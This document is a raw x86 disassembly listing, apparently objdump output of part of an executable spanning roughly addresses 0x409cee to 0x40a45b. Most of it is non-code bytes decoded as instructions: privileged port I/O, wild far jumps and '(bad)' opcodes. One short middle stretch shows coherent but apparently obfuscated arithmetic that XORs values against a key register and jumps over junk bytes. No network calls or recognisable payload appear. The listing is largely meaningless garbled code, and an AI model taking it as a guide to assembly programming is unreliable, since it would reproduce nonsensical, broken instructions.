  409cee:	aad    0xe6
  409cf0:	shl    BYTE PTR [ecx+esi*8+0x71],1
  409cf4:	push   ecx
  409cf5:	out    0xaa,eax
  409cf7:	push   esp
  409cf8:	stc    
  409cf9:	jmp    0x74c4dbf1
  409cfe:	jecxz  0x409d7e
  409d00:	jle    0x409d7c
  409d02:	jge    0x409d82
  409d04:	jle    0x409ccc
  409d06:	in     al,0x35
  409d08:	test   esp,0xf1b793cb
  409d0e:	pop    ds
  409d0f:	mov    esp,0x2fbf4215
  409d14:	xchg   ebx,eax
  409d15:	fadd   st,st(3)
  409d17:	xchg   BYTE PTR [ecx-0x1e],al
  409d1a:	je     0x409cb8
  409d1c:	jl     0x409d25
  409d1e:	push   ebp
  409d1f:	sbb    edi,DWORD PTR [ebp-0x67]
  409d22:	push   ebp
  409d23:	mov    bh,0x7c
  409d25:	mov    ch,0xee
  409d27:	fwait
  409d28:	inc    ebx
  409d29:	clc    
  409d2a:	pop    es
  409d2b:	mov    ds:0x515a9da9,al
  409d30:	sbb    DWORD PTR [ebx+0x8],0x39
  409d34:	cmp    bl,BYTE PTR [ecx+0x2b]
  409d37:	(bad)  
  409d38:	mov    edx,0xcf78ad74
  409d3d:	cmp    BYTE PTR [esi+0x49703dce],0xf7
  409d44:	mov    DWORD PTR [esi+0x18],ecx
  409d47:	gs lock mov ebp,0x9f874b2
  409d4e:	xor    DWORD PTR [ebp+0x36],eax
  409d51:	pop    esp
  409d52:	sti    
  409d53:	push   ebx
  409d54:	cmp    ecx,eax
  409d56:	stos   DWORD PTR es:[edi],eax
  409d57:	push   ecx
  409d58:	ror    BYTE PTR [edi+0x58],cl
  409d5b:	xchg   ebp,eax
  409d5c:	push   cs
  409d5d:	rcl    DWORD PTR [eax+0x5b],1
  409d60:	xchg   edi,eax
  409d61:	add    eax,0x3cc6c729
  409d66:	fsubr  st,st(2)
  409d68:	pop    DWORD PTR [esi+0x8]
  409d6b:	push   cs
  409d6c:	les    ebx,FWORD PTR [edx+0x17]
  409d6f:	(bad)  
  409d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d71:	cmp    sp,WORD PTR [esi+0x0]
  409d75:	repz and BYTE PTR cs:[eax-0x36],0xf8
  409d7b:	repnz popa 
  409d7d:	sahf   
  409d7e:	mov    ss,ecx
  409d80:	ins    BYTE PTR es:[edi],dx
  409d81:	cli    
  409d82:	push   es
  409d83:	dec    edx
  409d84:	loop   0x409d33
  409d86:	mov    edx,0xed96d28b
  409d8b:	popa   
  409d8c:	cmp    DWORD PTR [eax+0x68],0x20b36b40
  409d93:	sar    BYTE PTR [ebp-0x74],1
  409d96:	imul   eax,DWORD PTR [ecx],0xffffffe5
  409d99:	test   al,0x70
  409d9b:	cwde   
  409d9c:	out    0x6f,eax
  409d9e:	cmp    BYTE PTR [esi+ebp*1+0x1a9e7fe1],ch
  409da5:	stos   DWORD PTR es:[edi],eax
  409da6:	outs   dx,BYTE PTR ds:[esi]
  409da7:	push   cs
  409da8:	add    al,0x6a
  409daa:	add    ebp,edx
  409dac:	lods   eax,DWORD PTR ds:[esi]
  409dad:	cmp    ebx,DWORD PTR [ebx]
  409daf:	xchg   DWORD PTR [eax-0x7],ecx
  409db2:	cs and al,0xa1
  409db5:	out    dx,al
  409db6:	mov    bl,0x9b
  409db8:	mov    cl,0x94
  409dba:	div    BYTE PTR [eax]
  409dbc:	loopne 0x409d79
  409dbe:	mov    eax,0xe83270f7
  409dc3:	imul   eax,DWORD PTR [esi+0x3],0x13
  409dc7:	mov    WORD PTR [eax+0x3237ac90],ds
  409dcd:	sub    DWORD PTR [edi],esi
  409dcf:	lock push ecx
  409dd1:	and    esp,edx
  409dd3:	stos   BYTE PTR es:[edi],al
  409dd4:	jb     0x409e46
  409dd6:	or     eax,0xe07a3de8
  409ddb:	inc    esp
  409ddc:	inc    edi
  409ddd:	dec    esi
  409dde:	adc    DWORD PTR [ebx+0x8],ebp
  409de1:	arpl   WORD PTR [edx+0x3e],sp
  409de4:	fadd   QWORD PTR [eax-0xe]
  409de7:	push   cs
  409de8:	ror    BYTE PTR [edx+0x529210ea],cl
  409dee:	mov    bh,0x97
  409df0:	dec    esp
  409df1:	in     al,0x20
  409df3:	fidivr DWORD PTR [eax+0x3c]
  409df6:	adc    al,0x9f
  409df8:	sub    DWORD PTR [ebp+0x40],ebp
  409dfb:	cwde   
  409dfc:	adc    edx,edx
  409dfe:	retf   
  409dff:	sub    cl,al
  409e01:	inc    ecx
  409e02:	fwait
  409e03:	nop
  409e04:	mov    edi,0x885c1acc
  409e09:	dec    esp
  409e0a:	jne    0x409dd1
  409e0c:	inc    esi
  409e0d:	pop    ebp
  409e0e:	repz inc eax
  409e10:	nop
  409e11:	jmp    0x409e4f
  409e13:	xchg   ebp,eax
  409e14:	mov    eax,0x682dafda
  409e19:	aaa    
  409e1a:	jnp    0x409ddd
  409e1c:	jns    0x409e6d
  409e1e:	fldenv [edi+0x78]
  409e21:	pop    edx
  409e22:	ficom  DWORD PTR [esi-0xccbe599]
  409e28:	stos   DWORD PTR es:[edi],eax
  409e29:	push   cs
  409e2a:	sbb    bl,bl
  409e2c:	pusha  
  409e2d:	adc    DWORD PTR [edx+ebx*8],ebp
  409e30:	gs div dl
  409e33:	lock xor eax,0x1259ba51
  409e39:	repz (bad) 
  409e3c:	adc    BYTE PTR [eax],0xf7
  409e3f:	call   DWORD PTR fs:[esi]
  409e42:	test   al,bl
  409e44:	ror    DWORD PTR [eax+0x5c],1
  409e47:	in     eax,0x82
  409e49:	adc    bl,BYTE PTR [ecx-0x1a]
  409e4c:	xor    ecx,DWORD PTR [ebx]
  409e4e:	push   ds
  409e4f:	cs into 
  409e51:	sbb    esi,DWORD PTR [esi-0x60d0da74]
  409e57:	loope  0x409ebd
  409e59:	jmp    0x3cb9:0x64ded8d4
  409e60:	push   edx
  409e61:	in     al,0x9d
  409e63:	(bad)  
  409e64:	sti    
  409e65:	add    BYTE PTR [esi],ah
  409e67:	rcr    ebx,cl
  409e69:	mov    dl,0x6e
  409e6b:	ret    0xe6a2
  409e6e:	lock scas eax,DWORD PTR es:[edi]
  409e70:	daa    
  409e71:	in     eax,0xc6
  409e73:	sbb    DWORD PTR [ecx-0x52965cc1],0xe9b29d02
  409e7d:	jb     0x409e72
  409e7f:	je     0x409eb5
  409e81:	lods   al,BYTE PTR ds:[esi]
  409e82:	iret   
  409e83:	jl     0x409f04
  409e85:	in     eax,dx
  409e86:	rcr    DWORD PTR [edi],cl
  409e88:	or     eax,0xd698c714
  409e8d:	cmp    al,0xaf
  409e8f:	xchg   ebx,eax
  409e90:	lahf   
  409e91:	sti    
  409e92:	aam    0xd5
  409e94:	neg    ch
  409e96:	pop    edi
  409e97:	lods   eax,DWORD PTR ds:[esi]
  409e98:	xchg   ebx,eax
  409e9a:	in     al,dx
  409e9b:	mov    dl,0x68
  409e9d:	mov    dl,dh
  409e9f:	jne    0x409f16
  409ea1:	(bad)  
  409ea3:	shl    ecx,0x15
  409ea6:	mov    esi,0x6adc62bb
  409eab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409eac:	xor    al,0x37
  409eae:	iret   
  409eaf:	loop   0x409e57
  409eb1:	cli    
  409eb2:	inc    edx
  409eb3:	retf   
  409eb4:	ins    BYTE PTR es:[edi],dx
  409eb5:	add    al,0x1d
  409eb7:	les    edi,FWORD PTR [edi+0x7c]
  409eba:	imul   ebp,DWORD PTR [edi-0x54],0x969c7336
  409ec1:	fstp   TBYTE PTR [edi+0x2392c341]
  409ec7:	scas   eax,DWORD PTR es:[edi]
  409ec8:	pop    DWORD PTR [ecx+0x47]
  409ecb:	push   edi
  409ecc:	add    ah,BYTE PTR [edi+0x7]
  409ecf:	aad    0xfa
  409ed1:	int    0x58
  409ed3:	mov    ds:0x8a70e274,al
  409ed8:	cmp    bl,al
  409eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409edb:	into   
  409edc:	iret   
  409edd:	push   esp
  409ede:	add    DWORD PTR [edi+0x8],0xa2ce1619
  409ee5:	not    DWORD PTR [esi-0x324f2461]
  409eeb:	int3   
  409eec:	fistp  WORD PTR [ebx+0x13b1d8bd]
  409ef2:	pop    ds
  409ef3:	ins    DWORD PTR es:[edi],dx
  409ef4:	mov    cs,WORD PTR [eax]
  409ef6:	xchg   ebp,eax
  409ef7:	hlt    
  409ef8:	rcl    DWORD PTR [esi+ebp*4+0xdb63898],cl
  409eff:	fimul  WORD PTR [ebx-0x172e62b8]
  409f05:	inc    ebx
  409f06:	xor    DWORD PTR [edx+0x74fbe72d],0x384f75ee
  409f10:	nop
  409f11:	arpl   WORD PTR [edi],ax
  409f13:	push   ecx
  409f14:	(bad)  
  409f15:	(bad)  
  409f16:	jle    0x409f4d
  409f18:	sub    al,0xdb
  409f1a:	mov    esp,0x64bd2e20
  409f1f:	ss call 0x73e2:0xd2ea750b
  409f27:	sub    BYTE PTR [ebx],cl
  409f29:	xchg   ecx,eax
  409f2a:	addr16 das 
  409f2c:	outs   dx,BYTE PTR ds:[esi]
  409f2d:	and    bh,dl
  409f2f:	adc    eax,0x35af2975
  409f34:	inc    ebx
  409f35:	inc    edx
  409f36:	jnp    0x409f95
  409f38:	out    dx,al
  409f39:	mov    DWORD PTR [edx+0x71],eax
  409f3c:	jecxz  0x409fa2
  409f3e:	pop    es
  409f3f:	ret    0xea1e
  409f42:	pop    ds
  409f43:	lods   eax,DWORD PTR ds:[esi]
  409f44:	loopne 0x409fa9
  409f46:	push   es
  409f47:	jnp    0x409ef8
  409f49:	fbstp  TBYTE PTR [ecx-0x7388ed91]
  409f4f:	retf   0x7616
  409f52:	push   edi
  409f53:	shr    BYTE PTR [ebx-0x5833114a],0x66
  409f5a:	mov    ebp,0x770df6e2
  409f5f:	(bad)  
  409f60:	test   al,0xb6
  409f62:	or     BYTE PTR [edx-0x65ac2735],bh
  409f68:	out    dx,al
  409f69:	test   eax,0xfacb0e95
  409f6e:	shl    BYTE PTR [esi-0x7a461abf],0xb
  409f75:	xor    al,0xcf
  409f77:	or     dh,al
  409f79:	mov    bh,0xda
  409f7b:	inc    ebx
  409f7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f7d:	test   al,0x2a
  409f7f:	mov    BYTE PTR [edi+0x56a38b00],cl
  409f85:	popf   
  409f86:	in     al,dx
  409f87:	call   0x3e3a:0x5b9c144c
  409f8e:	nop
  409f8f:	clc    
  409f90:	add    cl,BYTE PTR [eax-0x5007ccee]
  409f96:	xor    DWORD PTR [edx-0x5f24fd20],esp
  409f9c:	jmp    0xcd52:0x80283c9a
  409fa3:	sub    ch,BYTE PTR [esi-0x3b]
  409fa6:	xor    bh,dh
  409fa8:	fst    DWORD PTR [ecx+0x1f5fad76]
  409fae:	pop    eax
  409faf:	mov    ebx,edx
  409fb1:	lea    esi,[edi-0xd4f37c8]
  409fb7:	aam    0x85
  409fb9:	jbe    0x409f86
  409fbb:	lods   eax,DWORD PTR ds:[esi]
  409fbc:	lahf   
  409fbd:	or     eax,0x81e0d42d
  409fc2:	adc    BYTE PTR [esi-0x63],bh
  409fc5:	stc    
  409fc6:	ret    0x14d3
  409fc9:	and    eax,0x7c06a13f
  409fce:	xor    esp,edx
  409fd0:	pop    ebp
  409fd1:	jecxz  0x40a00e
  409fd3:	mov    gs,WORD PTR [edi]
  409fd5:	adc    DWORD PTR [eax+0x20],esi
  409fd8:	fimul  DWORD PTR [esi+ecx*1-0x268c21d1]
  409fdf:	inc    ebx
  409fe0:	repnz push es
  409fe2:	pusha  
  409fe3:	dec    esi
  409fe4:	xor    ah,BYTE PTR [edi-0x47]
  409fe7:	push   ebp
  409fe8:	lock mov dl,0x27
  409feb:	adc    BYTE PTR [edi+0x12],al
  409fee:	pop    ecx
  409fef:	iret   
  409ff0:	in     al,0x17
  409ff2:	enter  0xb6a5,0x43
  409ff6:	cmp    eax,0xbe8f8ce5
  409ffb:	pusha  
  409ffc:	loopne 0x409fa4
  409ffe:	test   esp,ebp
  40a000:	es jecxz 0x409fb2
  40a003:	adc    ecx,ebx
  40a005:	gs adc al,0xdf
  40a008:	add    al,0x8b
  40a00a:	dec    ebp
  40a00b:	lock xor eax,esi
  40a00e:	add    eax,edi
  40a010:	mov    DWORD PTR [ecx],eax
  40a012:	mov    eax,DWORD PTR [ebp-0x10]
  40a015:	mov    ecx,DWORD PTR [ebp+0x10]
  40a018:	jmp    0x40a339
  40a01d:	enter  0xca7a,0x5
  40a021:	enter  0xd1d5,0xd3
  40a025:	sbb    esi,esp
  40a027:	mul    DWORD PTR [ebx-0x66]
  40a02a:	daa    
  40a02b:	aam    0x64
  40a02d:	jo     0x40a01d
  40a02f:	jle    0x40a0af
  40a031:	jp     0x40a0b0
  40a033:	jle    0x40a0b3
  40a035:	adc    al,0x10
  40a037:	loop   0x409fca
  40a039:	adc    eax,0x4636868
  40a03e:	clc    
  40a03f:	push   ebp
  40a040:	dec    edx
  40a041:	pusha  
  40a042:	mov    edx,DWORD PTR [edx]
  40a044:	shl    DWORD PTR [ebp+0x12],cl
  40a047:	(bad)  
  40a048:	cli    
  40a049:	pushf  
  40a04a:	mov    ebp,DWORD PTR [edx+0x3d]
  40a04d:	mov    WORD PTR [ebx-0x35],?
  40a050:	and    eax,0x50f75a0b
  40a055:	add    al,0x39
  40a057:	addr16 into 
  40a059:	jp     0x40a060
  40a05b:	mov    cs,WORD PTR [ecx-0x46]
  40a05e:	push   0x53
  40a060:	dec    esi
  40a061:	(bad)  
  40a063:	stos   BYTE PTR es:[edi],al
  40a064:	lds    ecx,FWORD PTR [edx-0x628298c6]
  40a06a:	jge    0x40a094
  40a06c:	mov    cl,0x55
  40a06e:	shr    DWORD PTR [esi],1
  40a070:	outs   dx,BYTE PTR ds:[esi]
  40a071:	cmp    al,0x9c
  40a073:	outs   dx,BYTE PTR ds:[esi]
  40a074:	retf   
  40a075:	dec    ecx
  40a076:	push   ebx
  40a077:	xor    BYTE PTR [edi-0x17],dh
  40a07a:	out    0x7d,al
  40a07c:	scas   al,BYTE PTR es:[edi]
  40a07d:	iret   
  40a07e:	add    bl,BYTE PTR [ecx+edi*1-0x6e]
  40a082:	nop
  40a083:	xor    ah,ch
  40a085:	xchg   edx,eax
  40a086:	test   DWORD PTR [ecx],eax
  40a088:	push   esi
  40a089:	cmp    ebp,DWORD PTR [edi+0x111fc0b7]
  40a08f:	mov    al,BYTE PTR [esi+0xc]
  40a092:	jmp    0xc22cc10d
  40a097:	lds    edi,FWORD PTR [ebx+0x48f9fe01]
  40a09d:	mov    edx,0x423820f2
  40a0a2:	or     eax,0x8c456dc7
  40a0a7:	in     al,0x74
  40a0a9:	pop    eax
  40a0aa:	dec    esp
  40a0ab:	mov    ds:0x21f5d664,al
  40a0b0:	mov    ah,0x54
  40a0b2:	pop    esi
  40a0b3:	arpl   WORD PTR [esi+0x386b3c7f],sp
  40a0b9:	(bad)  
  40a0ba:	cmp    eax,0xc7a96dd2
  40a0bf:	mov    ebp,0xcb3a6337
  40a0c4:	xor    DWORD PTR [ecx],esp
  40a0c6:	je     0x40a0ed
  40a0c8:	sti    
  40a0c9:	out    dx,eax
  40a0ca:	mov    DWORD PTR [eax+0x5dbc7a53],edx
  40a0d0:	mov    dh,0x3d
  40a0d2:	cwde   
  40a0d3:	std    
  40a0d4:	xlat   BYTE PTR ds:[ebx]
  40a0d5:	retf   0x183a
  40a0d8:	sub    ch,BYTE PTR [eax+0x14e2dcd1]
  40a0de:	mov    WORD PTR [ebx],fs
  40a0e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0e1:	add    ecx,esp
  40a0e3:	bswap  ebp
  40a0e5:	mov    dh,bl
  40a0e7:	push   ebx
  40a0e8:	dec    esp
  40a0e9:	repnz jmp 0xf588:0x9d079fd4
  40a0f1:	sbb    BYTE PTR [ecx-0x12bba574],0xd2
  40a0f8:	cmp    DWORD PTR [eax],edx
  40a0fa:	in     eax,dx
  40a0fb:	test   BYTE PTR [edi+ecx*2+0x24669cbf],bl
  40a102:	adc    dh,BYTE PTR [eax*1-0x6bd1bf7b]
  40a109:	cmp    ch,BYTE PTR [edi-0x31]
  40a10c:	mov    cl,0xa7
  40a10e:	mov    DWORD PTR [edi],edi
  40a110:	add    eax,0x466d972c
  40a115:	cmc    
  40a116:	sub    BYTE PTR [ecx+0x53],ch
  40a119:	loopne 0x40a0ed
  40a11b:	xor    edx,DWORD PTR [ebx+eax*1+0x26]
  40a11f:	imul   edx,ebx,0xc7b481fc
  40a125:	int    0xe0
  40a127:	push   cs
  40a128:	cmp    ebp,DWORD PTR [ecx+0x62]
  40a12b:	lods   al,BYTE PTR ds:[esi]
  40a12c:	push   edx
  40a12d:	jno    0x40a199
  40a12f:	pop    ebp
  40a130:	sub    DWORD PTR [esi+0x3e4725b1],esp
  40a136:	dec    ebx
  40a137:	adc    dh,BYTE PTR [ebx+0x70]
  40a13a:	adc    al,ch
  40a13c:	fnsave [esp+edi*4+0x7f2bba52]
  40a143:	test   DWORD PTR [ebx+0x0],ecx
  40a146:	clc    
  40a147:	xor    dl,ah
  40a149:	mov    WORD PTR [edx-0x77],es
  40a14c:	push   ecx
  40a14d:	mov    dl,0x7c
  40a14f:	fs pop esi
  40a151:	mov    al,0xd5
  40a153:	jmp    0x6438ad15
  40a158:	aad    0x18
  40a15a:	js     0x40a15c
  40a15c:	mov    al,ds:0x9fcc4d2
  40a161:	and    BYTE PTR [eax+ebp*8],dh
  40a164:	pop    es
  40a165:	das    
  40a166:	push   esp
  40a167:	and    dl,BYTE PTR [esi-0x61]
  40a16a:	inc    ebx
  40a16b:	sbb    eax,0x4fa7e00
  40a170:	and    dl,bl
  40a172:	push   ds
  40a173:	push   ds
  40a174:	mov    BYTE PTR [esi],dl
  40a176:	xlat   BYTE PTR ds:[ebx]
  40a177:	cwde   
  40a178:	adc    eax,0x3e031d23
  40a17d:	sbb    al,BYTE PTR [eax-0x19b0610a]
  40a183:	cmp    ebx,ecx
  40a185:	mov    ecx,0x340af1a4
  40a18a:	xor    DWORD PTR [ebx],0xf476c57b
  40a190:	fisttp WORD PTR [ebx-0x2684b5ff]
  40a196:	test   bh,bl
  40a198:	jb     0x40a15e
  40a19a:	pusha  
  40a19b:	push   ebx
  40a19c:	into   
  40a19d:	(bad)  
  40a19e:	scas   eax,DWORD PTR es:[edi]
  40a19f:	pop    ds
  40a1a0:	or     DWORD PTR [esi+0x5a],ebp
  40a1a3:	aam    0x85
  40a1a5:	xchg   ebp,ecx
  40a1a7:	lods   eax,DWORD PTR ds:[esi]
  40a1a8:	stc    
  40a1a9:	pop    es
  40a1aa:	scas   al,BYTE PTR es:[edi]
  40a1ab:	ss je  0x40a157
  40a1ae:	dec    ecx
  40a1af:	mov    dl,0x6e
  40a1b1:	sahf   
  40a1b2:	retf   0xd555
  40a1b5:	inc    eax
  40a1b6:	mov    dh,0xaf
  40a1b8:	jbe    0x40a21e
  40a1ba:	pop    ss
  40a1bb:	dec    ebx
  40a1bc:	leave  
  40a1bd:	enter  0xee24,0x2c
  40a1c1:	adc    esi,DWORD PTR [esi-0x2e2fb176]
  40a1c7:	js     0x40a1e7
  40a1c9:	push   eax
  40a1ca:	or     esi,DWORD PTR [ebp-0x4c]
  40a1cd:	push   ebp
  40a1ce:	jecxz  0x40a1f6
  40a1d0:	pop    ebx
  40a1d1:	aam    0xdd
  40a1d3:	jns    0x40a1de
  40a1d5:	daa    
  40a1d6:	mov    ds:0x61a23430,eax
  40a1db:	push   ds
  40a1dc:	and    WORD PTR [ebx],sp
  40a1df:	jg     0x40a19c
  40a1e1:	add    bl,BYTE PTR [ebp+edx*4+0x1d]
  40a1e5:	xor    DWORD PTR [esi-0x551f81ac],eax
  40a1eb:	adc    DWORD PTR [eax],ebp
  40a1ed:	dec    edx
  40a1ee:	repz lea eax,[edx+esi*4-0x55]
  40a1f3:	das    
  40a1f4:	or     ch,BYTE PTR [esi+0x4058042f]
  40a1fa:	sub    BYTE PTR [ebx-0x5b],ah
  40a1fd:	dec    edi
  40a1fe:	inc    edx
  40a1ff:	in     eax,0x2c
  40a201:	out    dx,al
  40a202:	fsub   DWORD PTR [ecx+0x2c9ee96e]
  40a208:	cmp    al,0xd
  40a20a:	daa    
  40a20b:	hlt    
  40a20c:	jns    0x40a201
  40a20e:	adc    al,0xd8
  40a210:	es cdq 
  40a212:	icebp  
  40a213:	clts   
  40a215:	or     eax,0x54
  40a218:	loope  0x40a1ef
  40a21a:	mov    ch,0x32
  40a21c:	xchg   esi,eax
  40a21d:	and    BYTE PTR [ebx],cl
  40a21f:	scas   al,BYTE PTR es:[edi]
  40a220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a221:	push   esp
  40a222:	inc    ebx
  40a223:	jle    0x40a296
  40a225:	scas   eax,DWORD PTR es:[edi]
  40a226:	call   0xf3df:0xce47431
  40a22d:	int    0xe7
  40a22f:	icebp  
  40a230:	or     BYTE PTR [ebx+0x26],al
  40a233:	aam    0x2b
  40a235:	imul   ebp,DWORD PTR [ebx],0xffffff87
  40a238:	push   cx
  40a23a:	dec    edi
  40a23b:	xor    DWORD PTR [ecx],ebx
  40a23d:	inc    esp
  40a23e:	aas    
  40a23f:	and    BYTE PTR [ecx+0x3a],ah
  40a242:	jecxz  0x40a1d8
  40a244:	(bad)  
  40a245:	mov    dl,0xf2
  40a247:	fild   QWORD PTR [eax]
  40a249:	adc    eax,0x643c2562
  40a24e:	repnz shr DWORD PTR [edx],0x3a
  40a252:	ins    BYTE PTR es:[edi],dx
  40a253:	xor    BYTE PTR [eax+0x2f],dl
  40a256:	loop   0x40a2a2
  40a258:	popa   
  40a259:	cs out dx,al
  40a25b:	jae    0x40a1fe
  40a25d:	shr    DWORD PTR [ecx+ecx*1+0x6e],0x58
  40a262:	scas   eax,DWORD PTR es:[edi]
  40a263:	inc    edi
  40a264:	hlt    
  40a265:	inc    edi
  40a266:	add    al,0x48
  40a268:	push   ds
  40a269:	mov    edi,0x8a9ba0bf
  40a26e:	pop    esi
  40a26f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a270:	ret    
  40a271:	pop    ss
  40a272:	or     DWORD PTR [ebp+0x34d006d7],eax
  40a278:	and    ah,BYTE PTR [edi]
  40a27a:	sub    BYTE PTR [edi-0x42eaa18e],0x5a
  40a281:	sahf   
  40a282:	and    edi,DWORD PTR [eax-0x71]
  40a285:	inc    ebx
  40a286:	or     DWORD PTR [ebp+0xc50fa55],0xffffffa9
  40a28d:	xor    ebx,esi
  40a28f:	mov    BYTE PTR [edi-0x3b46e72a],bh
  40a295:	lods   eax,DWORD PTR ds:[esi]
  40a296:	mov    edi,0xafca0edd
  40a29b:	(bad)  
  40a29c:	sbb    al,0x24
  40a29e:	xchg   ecx,eax
  40a29f:	pop    ss
  40a2a0:	push   ss
  40a2a1:	sub    DWORD PTR [edx+0x76eeda],ebp
  40a2a7:	adc    dl,cl
  40a2a9:	adc    DWORD PTR [ecx+0x626e577f],esp
  40a2af:	pop    esi
  40a2b0:	inc    esi
  40a2b1:	push   ecx
  40a2b2:	add    al,0xb9
  40a2b4:	mov    bh,0x31
  40a2b6:	inc    eax
  40a2b7:	sub    esi,DWORD PTR [esi-0x340b82ea]
  40a2bd:	adc    al,0xcb
  40a2bf:	aaa    
  40a2c0:	xchg   esi,eax
  40a2c1:	mov    eax,0xd49f91bf
  40a2c6:	ret    0xff28
  40a2c9:	int    0x69
  40a2cb:	mov    bl,BYTE PTR [edx-0x2c23a0b5]
  40a2d1:	mov    eax,ebx
  40a2d3:	dec    esp
  40a2d4:	icebp  
  40a2d5:	popf   
  40a2d6:	and    eax,0x35435193
  40a2db:	push   eax
  40a2dc:	jbe    0x40a2d7
  40a2de:	sbb    al,0x65
  40a2e0:	pop    ds
  40a2e1:	pop    ecx
  40a2e2:	adc    BYTE PTR [ebx-0x12],ch
  40a2e5:	gs sub al,bl
  40a2e8:	arpl   WORD PTR [edx],di
  40a2ea:	jle    0x40a366
  40a2ec:	mov    ecx,0xa6fec6b7
  40a2f1:	mov    eax,0xd560e68f
  40a2f6:	loope  0x40a2e9
  40a2f8:	mov    dl,0x85
  40a2fa:	rcr    DWORD PTR [ebx],1
  40a2fc:	js     0x40a2ad
  40a2fe:	or     DWORD PTR cs:[ebp-0x2a],edx
  40a302:	push   ebp
  40a303:	jb     0x40a2bb
  40a305:	dec    esi
  40a306:	(bad)  
  40a307:	fsubr  QWORD PTR [ecx-0x72e9ce97]
  40a30d:	or     cl,BYTE PTR [ebx]
  40a30f:	out    0x56,eax
  40a311:	sub    DWORD PTR ds:0x952e748,0x53
  40a318:	push   0x54e68c03
  40a31d:	cmp    al,0x80
  40a31f:	in     eax,0xee
  40a321:	inc    edi
  40a322:	mov    dl,0x9b
  40a324:	imul   eax,DWORD PTR ds:[eax],0x6e
  40a328:	hlt    
  40a329:	mov    BYTE PTR [edi],dl
  40a32b:	dec    ecx
  40a32c:	dec    ebp
  40a32d:	stos   BYTE PTR es:[edi],al
  40a32e:	push   edx
  40a32f:	leave  
  40a330:	jmp    0x40a2fc
  40a332:	pop    esp
  40a333:	and    bh,BYTE PTR [ecx+ebp*8+0x334e490c]
  40a33a:	into   
  40a33b:	mov    edx,0xffcd8d65
  40a340:	sub    edx,ecx
  40a342:	add    DWORD PTR [eax],edx
  40a344:	mov    eax,ds:0x413cb2
  40a349:	mov    eax,DWORD PTR [eax]
  40a34b:	mov    cx,WORD PTR [ebp-0x4]
  40a34f:	movzx  ecx,cx
  40a352:	add    ecx,DWORD PTR [eax]
  40a354:	mov    DWORD PTR [ebp-0x18],ecx
  40a357:	mov    eax,DWORD PTR [ebp+0xc]
  40a35a:	mov    ecx,DWORD PTR [ebp+0xc]
  40a35d:	xor    eax,esi
  40a35f:	add    eax,eax
  40a361:	xor    ecx,esi
  40a363:	sub    ecx,eax
  40a365:	mov    ax,WORD PTR [ebp-0x4]
  40a369:	movzx  eax,ax
  40a36c:	sub    ecx,edi
  40a36e:	cmp    eax,ecx
  40a370:	mov    eax,DWORD PTR [ebp+0x10]
  40a373:	movzx  ecx,WORD PTR [ebp-0x4]
  40a377:	jg     0x40a38c
  40a37d:	xor    eax,esi
  40a37f:	sub    ecx,eax
  40a381:	sub    ecx,edi
  40a383:	mov    WORD PTR [ebp-0x4],cx
  40a387:	jmp    0x40a399
  40a38c:	xor    eax,esi
  40a38e:	lea    eax,[eax+ecx*1+0x32729b]
  40a395:	mov    WORD PTR [ebp-0x4],ax
  40a399:	mov    eax,DWORD PTR [ebp-0xc]
  40a39c:	cmp    eax,ebx
  40a39e:	je     0x40a3b2
  40a3a4:	mov    eax,DWORD PTR [ebp-0x8]
  40a3a7:	mov    DWORD PTR [eax],0x60341e89
  40a3ad:	jmp    0x40c082
  40a3b2:	mov    eax,DWORD PTR [ebp+0x8]
  40a3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3b8:	xor    eax,esi
  40a3ba:	jmp    0x40a6db
  40a3bf:	retf   0x3136
  40a3c2:	out    dx,al
  40a3c3:	icebp  
  40a3c4:	jmp    0x20e2d69a
  40a3c9:	inc    ebx
  40a3ca:	popf   
  40a3cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3cc:	fnsave [esi+0x68]
  40a3cf:	jl     0x40a3bb
  40a3d1:	jle    0x40a451
  40a3d3:	jp     0x40a452
  40a3d5:	jle    0x40a455
  40a3d7:	jnp    0x40a35b
  40a3d9:	js     0x40a3f7
  40a3db:	fldenv [esi-0x43]
  40a3de:	add    BYTE PTR [edx+0x6],dl
  40a3e1:	dec    edx
  40a3e2:	adc    ebx,DWORD PTR [ebx-0x26fecd6]
  40a3e8:	ds mov bh,0x8e
  40a3eb:	cmp    BYTE PTR [edx+0x4d],0x8c
  40a3ef:	pop    edx
  40a3f0:	ss pop es
  40a3f2:	sbb    BYTE PTR [edi-0x59c628],bl
  40a3f8:	out    0x71,eax
  40a3fa:	mov    edi,0x1d3a1cd9
  40a3ff:	jmp    0x8cd9:0x4afc0430
  40a406:	xor    BYTE PTR [esp+edx*2-0x24],0x21
  40a40b:	pop    edx
  40a40c:	jnp    0x40a45f
  40a40e:	adc    DWORD PTR [ecx+0x5e],esi
  40a411:	lea    ecx,[esi+edi*2]
  40a414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a415:	jnp    0x40a3e9
  40a417:	lods   eax,DWORD PTR ds:[esi]
  40a418:	(bad)  
  40a419:	and    ah,BYTE PTR [esi+0x3e]
  40a41c:	and    eax,DWORD PTR [eax]
  40a41e:	leave  
  40a41f:	push   ss
  40a420:	inc    edx
  40a421:	fs inc ecx
  40a423:	mov    dl,0xd9
  40a425:	add    ebx,DWORD PTR [ebx+0x1fa348d4]
  40a42b:	add    eax,0xe5337cd1
  40a430:	push   ds
  40a431:	jg     0x40a3dd
  40a433:	mov    BYTE PTR [ecx],bh
  40a435:	pop    ebp
  40a436:	add    ch,ah
  40a438:	fsubr  DWORD PTR [eax]
  40a43a:	sbb    al,0x27
  40a43c:	add    BYTE PTR [ebp+ebp*4-0x6e56120],ah
  40a443:	xchg   esp,eax
  40a444:	outs   dx,BYTE PTR ds:[esi]
  40a445:	mov    ah,0x73
  40a447:	push   0xffffffef
  40a449:	mov    al,ds:0xcc13e8f9
  40a44e:	int3   
  40a44f:	xchg   ecx,eax
  40a450:	clc    
  40a451:	inc    esi
  40a452:	hlt    
  40a453:	retf   
  40a454:	inc    esi
  40a455:	pop    ds
  40a456:	scas   eax,DWORD PTR es:[edi]
  40a457:	push   esp
  40a458:	jp     0x40a4ac
  40a45a:	pop    edi
  40a45b:	(bad)  
